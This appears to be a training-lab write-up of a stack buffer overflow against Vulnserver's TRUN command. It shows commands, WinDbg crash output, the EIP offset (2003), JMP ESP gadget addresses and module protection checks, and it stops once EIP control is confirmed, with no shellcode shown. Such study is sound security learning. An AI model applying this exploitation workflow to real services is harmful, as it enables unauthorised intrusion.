## Research

```bash
❯ telnet 192.168.1.114 9999
Trying 192.168.1.114...
Connected to 192.168.1.114.
Escape character is '^]'.
Welcome to Vulnerable Server! Enter HELP for help.
HELP
Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
TRUN 42
TRUN COMPLETE
^]
telnet> quit
Connection closed.
```

```bash
❯ uv run python3 trun_exploit_v3.py --target-ip 192.168.1.114 --target-port 9999 --word-size 4 -l 5000
```

Sent 5000 A's
Windbg
```txt
0:000> g
ModLoad: 74ed0000 74f26000   C:\Windows\system32\mswsock.dll
(1b90.1edc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0114edec ebx=000000e4 ecx=009d9834 edx=00000000 esi=00401848 edi=00401848
eip=41414141 esp=0114f5cc ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???
0:001> r
eax=0114edec ebx=000000e4 ecx=009d9834 edx=00000000 esi=00401848 edi=00401848
eip=41414141 esp=0114f5cc ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???
0:001> .scriptload \users\dooley\documents\osed\osed.js
JavaScript script successfully loaded from 'C:\users\dooley\documents\osed\osed.js'
0:001> dx @$osed().triage()

=== CONTROL ===
EIP/RIP controlled: yes
Offset: n/a
Pattern: n/a

=== SEH ===
Overwritten: unknown
Next SEH: n/a
Handler: n/a

=== STACK ===
esp: 0x0114F5CC
Bad stack pointer: no
SP points into cyclic pattern: no
Shellcode candidates: none

=== GADGETS ===
JMP ESP/RSP:
  C:\Users\dooley\Documents\vulnserver\essfunc.dll+0x11AF
  C:\Users\dooley\Documents\vulnserver\essfunc.dll+0x11BB
  C:\Users\dooley\Documents\vulnserver\essfunc.dll+0x11C7
  C:\Users\dooley\Documents\vulnserver\essfunc.dll+0x11D3
  C:\Users\dooley\Documents\vulnserver\essfunc.dll+0x11DF
CALL ESP/RSP:
  C:\Windows\System32\KERNELBASE.dll+0xE8BC5
  C:\Windows\System32\KERNELBASE.dll+0xF0F31
  C:\Windows\System32\KERNELBASE.dll+0x1AF17C
  C:\Windows\System32\msvcrt.dll+0x801D
  C:\Windows\System32\msvcrt.dll+0xA47D
POP POP RET:
  C:\Users\dooley\Documents\vulnserver\essfunc.dll+0x11B3
  C:\Windows\System32\KERNELBASE.dll+0x1BA2DD
  C:\Users\dooley\Documents\vulnserver\essfunc.dll+0x11FB
  C:\Windows\System32\KERNELBASE.dll+0x1231D5
  C:\Windows\System32\KERNEL32.DLL+0x59F75
Stack pivots:
  C:\Windows\system32\mswsock.dll+0x21F22
  C:\Windows\system32\mswsock.dll+0x2B951
  C:\Windows\system32\mswsock.dll+0x2BB87
  C:\Windows\system32\mswsock.dll+0x3662F
  C:\Windows\system32\mswsock.dll+0x3663F

=== CONTEXT ===
Exception code: n/a
eip: 0x41414141

=== MODULE SCORE ===
Module                                               Score   ASLR      DEP       SafeSEH   System  
---------------------------------------------------  ------  --------  --------  --------  --------
C:\Users\dooley\Documents\vulnserver\vulnserver.exe  70      disabled  disabled  unknown   no      
C:\Users\dooley\Documents\vulnserver\essfunc.dll     70      disabled  disabled  unknown   no      
ntdll.dll                                            25      enabled   enabled   enabled   no      
C:\Windows\system32\mswsock.dll                      0       enabled   enabled   enabled   yes     
C:\Windows\System32\KERNELBASE.dll                   0       enabled   enabled   enabled   yes     
C:\Windows\System32\msvcrt.dll                       0       enabled   enabled   enabled   yes     

=== BADCHAR QUICK SCAN ===
Byte      Count   FirstOff
--------  ------  --------
0x00      32      992     
0x0A      0       n/a     
0x0D      0       n/a     
@$osed().triage() : true
```

Send pattern:
```text
0:000> g
ModLoad: 74ed0000 74f26000   C:\Windows\system32\mswsock.dll
(1fb8.1f5c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00e4efc8 ebx=000000e0 ecx=004c6a7c edx=00000000 esi=00401848 edi=00401848
eip=386f4337 esp=00e4f7a8 ebp=6f43366f iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
386f4337 ??              ???
0:001> dx @$osed().pattern_offset("386F4337")

=== Pattern Offset ===
[+] Format: msf
[+] Needle: 7Co8
[+] Offset: 2003
Why this matters for exploitation: Exact offset maps crash control to payload layout and exploit reliability.
@$osed().pattern_offset("386F4337") : true
```

Offset at 2003 bytes

```bash
❯ uv run python3 trun_exploit_v3.py --target-ip 192.168.1.114 --target-port 9999 --word-size 4 -l 2003
```

```text
0:000> g
ModLoad: 74ed0000 74f26000   C:\Windows\system32\mswsock.dll
(ba0.1efc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0165ecd0 ebx=000000d0 ecx=01255454 edx=00342a43 esi=00401848 edi=00401848
eip=42424242 esp=0165f4b0 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
42424242 ??              
```




